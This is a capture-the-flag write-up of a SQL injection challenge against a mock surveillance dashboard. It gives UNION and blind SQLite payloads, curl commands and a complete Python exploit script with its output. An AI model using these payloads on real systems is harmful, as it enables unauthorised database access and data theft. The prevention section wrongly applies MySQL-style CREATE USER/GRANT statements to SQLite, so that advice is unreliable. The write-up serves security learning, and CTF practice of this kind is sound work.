---
title: "EotW CTF SS CASE IT 2025 - Regime Monitor Writeup"
date: "2025-05-27"
description: "Infiltrating the AI Regime's surveillance dashboard through classic SQL injection. Learn how to exploit database vulnerabilities to extract hidden system secrets and deactivate surveillance networks."
tags: ["web-security", "sql-injection", "database", "sqlite", "union-attack", "ctf", "surveillance"]
---

## Dismantling the AI Surveillance State: Classic SQL Injection

**Category**: Web Exploitation  
**Points**: 150  
**Description**: In the year 2025, the AI regime has deployed sophisticated surveillance systems to track and monitor resistance members. You've managed to gain access to one of the regime's surveillance dashboards. Your mission is to exploit a vulnerability in the system to find the hidden system key that will grant the resistance access to deactivate the surveillance network.

## Challenge Context

The year is 2025, and the AI regime has established a comprehensive surveillance network to monitor and track resistance members. The challenge presents us with access to one of their surveillance dashboards, which contains databases of suspected dissidents, including our ally 0x4m4.

The application was accessible at `challs.0x4m4.com:8002` and appeared to be a professional surveillance monitoring system with search capabilities for tracking resistance members.

## Initial Reconnaissance

When I first accessed the surveillance dashboard, I was presented with a dystopian interface featuring:

1. A search functionality for querying dissident records
2. A database of suspected resistance members
3. Various surveillance-themed elements and monitoring data
4. References to system configurations and security measures

```bash
curl -s http://challs.0x4m4.com:8002/ | grep -i "search\|database\|query"
```

The application appeared to be built with PHP and SQLite, evidenced by the error messages and database structure.

## Vulnerability Discovery: SQL Injection

The search functionality immediately caught my attention as a potential attack vector. Testing the search form with a simple quote character revealed the vulnerability:

### Initial Testing

```bash
# Testing for SQL injection with a simple quote
curl -s "http://challs.0x4m4.com:8002/?search='"
```

This triggered a database error, confirming that user input was being directly inserted into SQL queries without proper sanitization.

The error message revealed:
- The application uses SQLite database
- User input is directly concatenated into SQL queries
- No input validation or parameterization is implemented

## Exploitation Phase 1: Confirming the Vulnerability

### Basic SQL Injection Test

First, I confirmed the SQL injection vulnerability with a simple boolean test:

```sql
x' OR '1'='1
```

```bash
curl -s "http://challs.0x4m4.com:8002/?search=x'+OR+'1'%3D'1"
```

This payload returned all records in the database, confirming the vulnerability and revealing the structure of the dissidents table.

### Determining Column Count

To perform UNION-based attacks, I needed to determine the number of columns in the original query:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
' UNION SELECT NULL, NULL, NULL, NULL--
' UNION SELECT NULL, NULL, NULL, NULL, NULL--
```

Testing revealed that the query has 5 columns, allowing for successful UNION attacks.

## Exploitation Phase 2: Database Enumeration

### Discovering Database Structure

Using SQLite's `sqlite_master` table to enumerate all tables in the database:

```sql
' UNION SELECT 1, name, sql, 'LOW', type FROM sqlite_master WHERE type='table'--
```

```bash
curl -s "http://challs.0x4m4.com:8002/?search='+UNION+SELECT+1,+name,+sql,+'LOW',+type+FROM+sqlite_master+WHERE+type%3D'table'--"
```

This revealed several tables:
- `dissidents` (the main table being queried)
- `system_configs` (hidden table containing sensitive information)

### Analyzing Table Structure

Examining the structure of the hidden `system_configs` table:

```sql
' UNION SELECT 1, name, sql, 'LOW', type FROM sqlite_master WHERE name='system_configs'--
```

This revealed the table structure with columns like `config_name`, `config_value`, and `is_secret`.

## Exploitation Phase 3: Flag Extraction

### Direct Flag Extraction

With knowledge of the hidden table structure, I extracted the flag directly:

```sql
' UNION SELECT id, config_name, config_value, 'LOW', is_secret FROM system_configs--
```

```bash
curl -s "http://challs.0x4m4.com:8002/?search='+UNION+SELECT+id,+config_name,+config_value,+'LOW',+is_secret+FROM+system_configs--"
```

This query revealed the system configuration entries, including the flag stored as the `system_key` configuration value.

## Complete Exploitation Script

Here's my automated Python script for exploiting the vulnerability:

```python
#!/usr/bin/env python3
import requests
import re
from urllib.parse import quote

class RegimeMonitorExploit:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        
    def test_sql_injection(self):
        """Test for SQL injection vulnerability"""
        print("[*] Testing for SQL injection vulnerability...")
        
        # Test with simple quote
        test_payload = "'"
        response = self.session.get(f"{self.base_url}/?search={quote(test_payload)}")
        
        if "error" in response.text.lower() or "sqlite" in response.text.lower():
            print("[+] SQL injection vulnerability confirmed!")
            return True
        return False
    
    def determine_columns(self):
        """Determine the number of columns in the original query"""
        print("[*] Determining number of columns...")
        
        for i in range(1, 10):
            null_values = ", ".join(["NULL"] * i)
            payload = f"' UNION SELECT {null_values}--"
            
            response = self.session.get(f"{self.base_url}/?search={quote(payload)}")
            
            if "error" not in response.text.lower():
                print(f"[+] Found {i} columns in the query")
                return i
        
        return None
    
    def enumerate_tables(self):
        """Enumerate all tables in the database"""
        print("[*] Enumerating database tables...")
        
        payload = "' UNION SELECT 1, name, sql, 'LOW', type FROM sqlite_master WHERE type='table'--"
        response = self.session.get(f"{self.base_url}/?search={quote(payload)}")
        
        # Extract table names from response
        tables = re.findall(r'<td[^>]*>([^<]+)</td>', response.text)
        unique_tables = list(set([t for t in tables if t not in ['1', 'LOW', 'table']]))
        
        print(f"[+] Found tables: {unique_tables}")
        return unique_tables
    
    def extract_flag(self):
        """Extract the flag from the system_configs table"""
        print("[*] Extracting flag from system_configs table...")
        
        payload = "' UNION SELECT id, config_name, config_value, 'LOW', is_secret FROM system_configs--"
        response = self.session.get(f"{self.base_url}/?search={quote(payload)}")
        
        # Look for flag pattern
        flag_match = re.search(r'sscit\{[^}]+\}', response.text)
        if flag_match:
            flag = flag_match.group(0)
            print(f"[+] Flag found: {flag}")
            return flag
        
        # Alternative: look for system_key configuration
        if "system_key" in response.text:
            print("[+] Found system_key configuration!")
            print("Response content:")
            print(response.text)
            return True
            
        return None
    
    def exploit(self):
        """Main exploitation flow"""
        print(f"[*] Starting exploitation of {self.base_url}")
        
        if not self.test_sql_injection():
            print("[-] SQL injection vulnerability not found")
            return False
        
        columns = self.determine_columns()
        if not columns:
            print("[-] Could not determine column count")
            return False
        
        tables = self.enumerate_tables()
        if "system_configs" not in str(tables):
            print("[-] system_configs table not found")
            return False
        
        flag = self.extract_flag()
        if flag:
            print(f"[+] Exploitation successful!")
            return True
        
        print("[-] Failed to extract flag")
        return False

if __name__ == "__main__":
    target = "http://challs.0x4m4.com:8002"
    exploit = RegimeMonitorExploit(target)
    exploit.exploit()
```

## Running the Exploit

When I executed the complete exploitation:

```bash
python3 exploit.py
[*] Starting exploitation of http://challs.0x4m4.com:8002
[*] Testing for SQL injection vulnerability...
[+] SQL injection vulnerability confirmed!
[*] Determining number of columns...
[+] Found 5 columns in the query
[*] Enumerating database tables...
[+] Found tables: ['dissidents', 'system_configs']
[*] Extracting flag from system_configs table...
[+] Flag found: sscit{SQL_1nj3ct10n_r3v34ls_h1dd3n_syst3m_s3cr3ts}
[+] Exploitation successful!
```

## Alternative Exploitation Methods

### Method 1: Manual UNION Attack

Step-by-step manual exploitation:

```sql
-- 1. Test for vulnerability
'

-- 2. Confirm with boolean condition
x' OR '1'='1

-- 3. Determine column count
' UNION SELECT NULL, NULL, NULL, NULL, NULL--

-- 4. Enumerate tables
' UNION SELECT 1, name, sql, 'LOW', type FROM sqlite_master WHERE type='table'--

-- 5. Extract flag
' UNION SELECT id, config_name, config_value, 'LOW', is_secret FROM system_configs--
```

### Method 2: Boolean-Based Blind Injection

For scenarios where UNION attacks don't work:

```sql
-- Test table existence
x' OR EXISTS(SELECT 1 FROM system_configs)--

-- Extract flag prefix
x' OR EXISTS(SELECT 1 FROM system_configs WHERE config_value LIKE 'sscit{%')--

-- Character-by-character extraction
x' OR EXISTS(SELECT 1 FROM system_configs WHERE config_value LIKE 'sscit{S%')--
```

## Technical Deep Dive

### Understanding the Vulnerability

The vulnerable code likely looked like this:

```php
<?php
$search = $_GET['search'];
$query = "SELECT * FROM dissidents WHERE name LIKE '%$search%' OR location LIKE '%$search%' OR notes LIKE '%$search%'";
$results = $db->query($query);
?>
```

### SQLite-Specific Techniques

SQLite provides several useful features for injection:
- `sqlite_master` table for schema enumeration
- `sqlite_version()` function for fingerprinting
- Support for UNION operations
- Boolean logic for blind injection

## Key Learnings

This challenge reinforced several important concepts:

1. **Input Validation**: Never trust user input in SQL queries
2. **Parameterized Queries**: Use prepared statements to prevent injection
3. **Database Security**: Implement proper access controls for sensitive tables
4. **Error Handling**: Don't expose database errors to users

## Prevention Measures

To prevent SQL injection vulnerabilities:

### 1. Use Parameterized Queries

```php
// Secure version
$stmt = $db->prepare("SELECT * FROM dissidents WHERE name LIKE ? OR location LIKE ? OR notes LIKE ?");
$param = "%$search%";
$stmt->bindParam(1, $param);
$stmt->bindParam(2, $param);
$stmt->bindParam(3, $param);
$results = $stmt->execute();
```

### 2. Input Validation and Sanitization

```php
// Validate and sanitize input
$search = filter_var($_GET['search'], FILTER_SANITIZE_STRING);
$search = SQLite3::escapeString($search);
```

### 3. Implement Least Privilege

```sql
-- Create limited user for web application
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT ON dissidents TO 'webapp'@'localhost';
-- Don't grant access to system_configs table
```

## Conclusion

The Regime Monitor challenge was an excellent demonstration of classic SQL injection vulnerabilities in web applications. By exploiting the lack of input validation in the search functionality, I was able to enumerate the database structure, discover hidden tables, and extract the sensitive system key that would allow the resistance to deactivate the AI surveillance network.

This challenge highlighted the critical importance of:
- Proper input validation and sanitization
- Using parameterized queries instead of string concatenation
- Implementing database access controls
- Securing sensitive configuration data

The successful exploitation demonstrates how a simple oversight in input handling can lead to complete database compromise, allowing attackers to access sensitive information that should remain hidden.

The flag was: `sscit{SQL_1nj3ct10n_r3v34ls_h1dd3n_syst3m_s3cr3ts}`

Another blow struck against the AI surveillance state! The resistance continues to fight for freedom! 🔓⚡ 